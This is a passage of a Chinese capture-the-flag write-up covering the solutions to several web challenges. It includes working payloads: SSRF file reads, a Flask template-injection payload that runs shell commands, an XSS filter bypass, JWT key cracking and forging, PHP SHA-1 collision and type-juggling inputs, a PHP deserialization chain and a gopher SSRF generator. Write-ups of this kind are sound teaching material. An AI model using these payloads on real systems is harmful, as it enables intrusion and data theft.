class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ssrf_me</span>(<span class="params"><span class="variable">$url</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$ch</span> = curl_init();</span><br><span class="line">        curl_setopt(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">        curl_setopt(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        <span class="variable">$output</span> = curl_exec(<span class="variable">$ch</span>);</span><br><span class="line">        curl_close(<span class="variable">$ch</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$output</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]))&#123;</span><br><span class="line">    ssrf_me(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;!-- 有没有一种可能，flag在根目录 --&gt;&quot;</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>明显是一个<code>ssrf</code>，然后还告诉了我们flag在根目录下，那就直接用<code>file:///flag</code>读取它就完了，直接拿下</p><p><img src="https://i.loli.net/2021/10/20/NIGxOL6h4lqugzr.png" alt="image.png"></p><h2 id="7-babyPy"><a href="#7-babyPy" class="headerlink" title="7.babyPy"></a>7.babyPy</h2><p>题目地址：<a href="http://1.14.102.22:8124/">http://1.14.102.22:8124/</a></p><p>一道<code>python</code>的<code>flask</code>模板的<code>ssti</code>注入，没有过滤，挺简单的</p><p>我们先在<code>title</code>那里输入<code>&#123;&#123;1+1&#125;&#125;</code>测试它是否存在<code>ssti</code>，结果它在标题那里直接返回了2，说明是存在的，那直接用<code>payload</code>去打就行了，payload如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;&#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;].eval(&quot;__import__(&#x27;o&#x27;+&#x27;s&#x27;).popen(&#x27;在这里输命令&#x27;).read()&quot;) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure><p>输命令的地方直接<code>cat /flag</code>就可以了</p><p><img src="https://i.loli.net/2021/10/21/u4Dv8HEhZQyItc7.png" alt="image.png"></p><h2 id="8-蜜雪冰城甜蜜蜜"><a href="#8-蜜雪冰城甜蜜蜜" class="headerlink" title="8.蜜雪冰城甜蜜蜜"></a>8.蜜雪冰城甜蜜蜜</h2><p>题目地址：<a href="http://106.55.154.252:8083/">http://106.55.154.252:8083</a></p><p>这道题是我觉得这期极客大挑战中最无聊的一道题，不知道出题人想考什么，<code>js</code>中给了一堆迷惑条件；刚开始我想的是伪造签名，把rsa解出来，就耽搁了很多时间，后面发现不太行，原来是在前端直接改<code>id</code>，把<code>id</code>改成<code>9</code>然后再点它就可以点出第九杯奶茶了</p><p><img src="https://i.loli.net/2021/10/21/wWlXUj7pHYnkJIm.png" alt="image.png"></p><p><img src="https://i.loli.net/2021/10/21/LdeUu3ipkZMPvWX.png" alt="image.png"></p><h2 id="9-雷克雅未克"><a href="#9-雷克雅未克" class="headerlink" title="9.雷克雅未克"></a>9.雷克雅未克</h2><p>题目地址：<a href="http://106.55.154.252:1209/">http://106.55.154.252:1209</a></p><p>一道挺简单的伪造XFF头，这题前端做的是真挺酷炫的哈哈哈</p><p>首先用它给出的ip放入它给的网站中查询，查出经纬度为：</p><p><img src="https://i.loli.net/2021/10/26/spV1CklSjaqiUun.png" alt="image.png"></p><p>然后抓check.php的包，修改经纬度以及XFF头</p><p><img src="https://i.loli.net/2021/10/26/zsGJr8OVdtMQjxB.png" alt="image.png"></p><p>得到<code>JsFuck</code>编码，直接在浏览器控制台运行就行</p><p><img src="https://i.loli.net/2021/10/26/ceuyNPEojOF3lJD.png" alt="image.png"></p><h2 id="10-人民艺术家"><a href="#10-人民艺术家" class="headerlink" title="10.人民艺术家"></a>10.人民艺术家</h2><p>题目地址：<a href="http://106.55.154.252:2019/">http://106.55.154.252:2019/</a></p><p>一道JWT伪造的题，需要先构造出密钥然后伪造出JWT，再给它传回去就行</p><p>首先进去之后用户名账号随便输，它就会告诉我们真账号</p><p><img src="https://i.loli.net/2021/10/26/hR8ex1HO9aGjm6i.png" alt="image.png"></p><p>然后输入真账号之后抓包，可以看到JWT为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0aW1lIjoiMjAyMSIsIm5hbWUiOiJmYWtlX2FkbWluIn0.rclssTrPKaSGoIPJZ0RxKIb1h_DDTtxzHQIQ0Vlbj7g</span><br></pre></td></tr></table></figure><p>先用爆破的工具：jwtcrack爆破密钥，爆破出来为1234：</p><p><img src="https://i.loli.net/2021/10/26/wWbg3CsqPUjmtiQ.png" alt="image.png"></p><p>然后放到JWT的解密网站：<a href="https://jwt.io/">https://jwt.io/</a> 解密，把time改为2019，把name改为admin，密钥1234填上</p><p><img src="https://i.loli.net/2021/10/26/j325pEhqsXSuWzt.png" alt="image.png"></p><p>然后把这个JWT在burp中给它传回去就行了，就在headers处传就行</p><p><img src="https://i.loli.net/2021/10/26/rxkq8ihaSWVR6w1.png" alt="image.png"></p><p>访问那个php文件，得到flag：SYC{X1a0_Ch0u_hello_Why_S0_Ser10us}</p><h2 id="11-babyxss"><a href="#11-babyxss" class="headerlink" title="11.babyxss"></a>11.babyxss</h2><p>题目地址：<a href="http://cat.simpfun.cn:2333/">http://cat.simpfun.cn:2333/</a></p><p>一道挺简单的<code>xss</code>，只要我们构造出闭合弹个<code>1</code>出来就可以了</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params">input</span>)</span>&#123;input = input.replace(<span class="regexp">/alert/</span>,<span class="string">&#x27;&#x27;</span>);<span class="keyword">return</span> <span class="string">&#x27;&lt;script&gt;console.log(&quot;&#x27;</span>+input+<span class="string">&#x27;&quot;);&lt;/script&gt;&#x27;</span>;&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>前面有个<code>(&#39;</code>那我们给他个<code>&#39;)</code>闭合，后面有个<code>&#39;)</code>，来个<code>(&#39;</code>闭合就行了，然后前面有<code>&lt;script&gt;</code>标签，所以说要来个<code>&lt;/script&gt;</code>来闭合，而最后有一个<code>&lt;/script&gt;</code>，所以说前面要加一个<code>&lt;script&gt;</code></p><p>然后中间就是一个常规的<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>，由于它把<code>alert</code>替换为空，所以说我们需要双写绕过，用<code>alealertrt</code>就行</p><p>最终payload为：<code>&#39;)&lt;/script&gt;&lt;script&gt;alealertrt(1)&lt;/script&gt;&lt;script&gt;(&#39;</code></p><p><img src="https://i.loli.net/2021/10/21/7tGc1bIF4wHNUqp.png" alt="image.png"></p><p>把单引号改成双引号也行哈，都能弹哈哈哈</p><h2 id="12-Baby-PHP-Black-Magic-Enlightenment"><a href="#12-Baby-PHP-Black-Magic-Enlightenment" class="headerlink" title="12.Baby_PHP_Black_Magic_Enlightenment"></a>12.Baby_PHP_Black_Magic_Enlightenment</h2><p>题目地址：<a href="http://tc.rigelx.top:8003/">http://tc.rigelx.top:8003/</a></p><p>一道php黑魔法的题，考的一些php语言的特性，不算很难但是是真的套娃，套了不知道多少层哈哈哈，先看第一层：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;PHP is the best Language &lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Have you ever heard about PHP Black Magic&lt;br/&gt;&quot;</span>;</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$temp</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">is_numeric(<span class="variable">$temp</span>)?<span class="keyword">die</span>(<span class="string">&quot;no numeric&quot;</span>):<span class="literal">NULL</span>;    </span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$temp</span>&gt;<span class="number">1336</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> file_get_contents(<span class="string">&#x27;./2.php&#x27;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;How&#x27;s that possible&quot;</span>;</span><br><span class="line">&#125; </span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">//Art is long, but life is short. </span></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>先看第一层，让我们GET传进去一个参数，不能是纯数字而且大小要大于1336，那我们随便传一串大于1336的数字最后加几个字母就行了，比如说像<code>9999abc</code>；或者直接用数组绕过也行，比如<code>password[]=1</code>，这样就进入了下一层：<code>baby_magic.php</code>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$flag</span>=getenv(<span class="string">&#x27;flag&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>])) </span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>] == <span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>])</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;p&gt;Your password can not be your name!&lt;/p&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (sha1(<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>]) === sha1(<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>]))</span><br><span class="line">      <span class="keyword">die</span>(<span class="string">&#x27;Flag: &#x27;</span>.<span class="variable">$flag</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;p&gt;Invalid password.&lt;/p&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;p&gt;Login first!&lt;/p&gt;&#x27;</span>;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>一个<code>sha1</code>的强碰撞，但没有禁掉数组，那就数组直接梭哈了：<code>name[]=1&amp;password[]=2</code>，得到结果<code>baby_revenge.php</code>，继续访问：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$flag</span>=getenv(<span class="string">&#x27;fllag&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>])) </span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>] == <span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>])</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;p&gt;Your password can not be your name!&lt;/p&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(is_array(<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>]) || is_array(<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>]))</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;There is no way you can sneak me, young man!&#x27;</span>);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (sha1(<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>]) === sha1(<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>]))&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;Hanzo:It is impossible only the tribe of Shimada can controle the dragon&lt;br/&gt;&quot;</span>;</span><br><span class="line">      <span class="keyword">die</span>(<span class="string">&#x27;Genji:We will see again Hanzo&#x27;</span>.<span class="variable">$flag</span>.<span class="string">&#x27;&lt;br/&gt;&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;p&gt;Invalid password.&lt;/p&gt;&#x27;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;p&gt;Login first!&lt;/p&gt;&#x27;</span>;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>来了个升级版，禁掉了数组，呵呵，那就直接用<code>sha1</code>强碰撞的<code>payload</code>去打嘛，只不过这<code>payload</code>比较长：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01sF%DC%91f%B6%7E%11%8F%02%9A%B6%21%B2V%0F%F9%CAg%CC%A8%C7%F8%5B%A8Ly%03%0C%2B%3D%E2%18%F8m%B3%A9%09%01%D5%DFE%C1O%26%FE%DF%B3%DC8%E9j%C2/%E7%BDr%8F%0EE%BC%E0F%D2%3CW%0F%EB%14%13%98%BBU.%F5%A0%A8%2B%E31%FE%A4%807%B8%B5%D7%1F%0E3.%DF%93%AC5%00%EBM%DC%0D%EC%C1%A8dy%0Cx%2Cv%21V%60%DD0%97%91%D0k%D0%AF%3F%98%CD%A4%BCF%29%B1&amp;password=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01%7FF%DC%93%A6%B6%7E%01%3B%02%9A%AA%1D%B2V%0BE%CAg%D6%88%C7%F8K%8CLy%1F%E0%2B%3D%F6%14%F8m%B1i%09%01%C5kE%C1S%0A%FE%DF%B7%608%E9rr/%E7%ADr%8F%0EI%04%E0F%C20W%0F%E9%D4%13%98%AB%E1.%F5%BC%94%2B%E35B%A4%80-%98%B5%D7%0F%2A3.%C3%7F%AC5%14%E7M%DC%0F%2C%C1%A8t%CD%0Cx0Z%21Vda0%97%89%60k%D0%BF%3F%98%CD%A8%04F%29%A1</span><br></pre></td></tr></table></figure><p>得到了<code>here_s_the_flag.php</code>，继续访问嘛：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$flag</span>=getenv(<span class="string">&#x27;flllllllllag&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(strstr(<span class="string">&quot;hackerDJ&quot;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>])) &#123;</span><br><span class="line">  <span class="keyword">echo</span>(<span class="string">&quot;&lt;p&gt;not allowed!&lt;/p&gt;&quot;</span>);</span><br><span class="line">  <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>] = urldecode(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>] === <span class="string">&quot;hackerDJ&quot;</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Access granted!&lt;/p&gt;&quot;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;flag: <span class="subst">$flag</span> &lt;/p&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>这一层挺简单的，把<code>hackerDJ</code>用<code>url</code>两次编码就行了，或者只编一个字母也行，用<code>GET</code>传一个<code>id=%25%36%38ackerDJ</code>就行</p><p><img src="https://i.loli.net/2021/10/21/4Jg6DtxSafmbROk.png" alt="image.png"></p><p>终于出flag了哈哈哈</p><h2 id="13-easyPOP"><a href="#13-easyPOP" class="headerlink" title="13.easyPOP"></a>13.easyPOP</h2><p>题目地址：<a href="http://1.14.102.22:8002/">http://1.14.102.22:8002/</a></p><p>这道题是<code>NoVic4</code>给我的<code>exp</code>，我也还没完全研究透，主要是我没搞懂这数组是什么个操作，先放上吧，供师傅们研究：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">d</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$value</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;value=<span class="string">&quot;system&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">b</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$b</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;b=[<span class="keyword">$this</span>,<span class="string">&#x27;eval&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">c</span> <span class="keyword">extends</span> <span class="title">b</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$call</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$value</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">a</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;call=[<span class="keyword">new</span> d(),<span class="string">&#x27;eval&#x27;</span>];</span><br><span class="line">        <span class="variable">$x</span>=<span class="keyword">new</span> d();</span><br><span class="line">        <span class="variable">$x</span>-&gt;value=<span class="string">&quot;cat /flag&quot;</span>;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;value=[<span class="variable">$x</span>,<span class="string">&quot;eval&quot;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">a</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$test</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;test;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> a();</span><br><span class="line"><span class="variable">$c</span>=<span class="keyword">new</span> c();</span><br><span class="line"><span class="variable">$c</span>-&gt;a();</span><br><span class="line"><span class="variable">$a</span>-&gt;test=<span class="variable">$c</span>;</span><br><span class="line"><span class="keyword">echo</span> base64_encode(serialize(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure><h2 id="14-期末不挂科就算成功"><a href="#14-期末不挂科就算成功" class="headerlink" title="14.期末不挂科就算成功"></a>14.期末不挂科就算成功</h2><p>题目地址：<a href="http://106.55.154.252:8010/">http://106.55.154.252:8010</a></p><p>挺离谱的一道题，感觉题目交代的很不清楚，刚开始不知道题目想干什么，后面听别人说就是一个简单的<code>SSRF</code>实现一个<code>POST</code>传参</p><p>首先进去之后<code>f12</code>，找到了一个<code>debug.php</code>，访问它发现是一个文件包含，先用伪协议读出<code>index.php</code>和<code>debug.php</code>的源码</p><p><code>index.php</code>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$ch</span> = curl_init();</span><br><span class="line">curl_setopt(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]);</span><br><span class="line"><span class="comment">#curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);</span></span><br><span class="line">curl_setopt(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line"><span class="comment">#curl_setopt($ch, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS);</span></span><br><span class="line">curl_exec(<span class="variable">$ch</span>);</span><br><span class="line">curl_close(<span class="variable">$ch</span>);</span><br><span class="line"><span class="comment">//你当前位于学校172.17.0.0/24网段下 其实还有台机子里面可以修改成绩 我偷偷告诉你password是123456,name是admin,//result必须要改成60 不然学校会查的！！！</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>debug.php</code>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;h1&gt;快去学习PHP伪协议&lt;/h1&gt;&quot;</span>;</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(strstr(<span class="variable">$file</span>,<span class="string">&quot;../&quot;</span>)||stristr(<span class="variable">$file</span>, <span class="string">&quot;tp&quot;</span>)||stristr(<span class="variable">$file</span>,<span class="string">&quot;input&quot;</span>)||stristr(<span class="variable">$file</span>,<span class="string">&quot;data&quot;</span>))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;NO！！！&quot;</span>;</span><br><span class="line"><span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$file</span>); </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>明显是一个<code>SSRF</code>，并且告诉了我们网段是：<code>172.17.0.0</code>，那我们就先扫一扫看看管理员的地址是什么，扫出来是<code>172.17.0.7</code></p><p><img src="https://i.loli.net/2021/11/07/U4itK6MjVzuAgcr.png" alt="image.png"></p><p>然后在这我就卡了很久，不知道他想让我们用<code>SSRF</code>，刚开始我想的是它告诉了我们<code>username</code>和<code>password</code>，那我们可以给它传进去，但我怎么都没想到他提示中的<code>result</code>必须要改成60的意思是传一个<code>result=60</code>，真就离谱，那这样就简单了呀，直接向管理员页面传一个<code>username=admin&amp;password=123456&amp;result=60</code>，用<code>gopher</code>实现<code>POST</code>传参就行了，接下来来构造<code>gopher</code>的<code>payload</code>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"></span><br><span class="line">POST=<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">POST /index.php HTTP/1.1</span></span><br><span class="line"><span class="string">Host: 127.0.0.1</span></span><br><span class="line"><span class="string">Content-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="string">Content-Length: 36</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">password=123456&amp;name=admin&amp;result=60</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">tmp=urllib.parse.quote(POST)</span><br><span class="line">new = tmp.replace(<span class="string">&#x27;%0A&#x27;</span>,<span class="string">&#x27;%0D%0A&#x27;</span>)</span><br><span class="line">payload =<span class="string">&#x27;gopher://172.17.0.7:80/_&#x27;</span>+urllib.parse.quote(new)</span><br><span class="line"><span class="built_in">print</span>(payload)</span><br></pre></td></tr></table></figure><p>就这样了，直接去打就行：</p><p><img src="https://i.loli.net/2021/11/07/nDfj7Qcgsokl5bB.png" alt="image.png"></p><h2 id="15-成全"><a href="#15-成全" class="headerlink" title="15.成全"></a>15.成全</h2><p>题目地址：<a 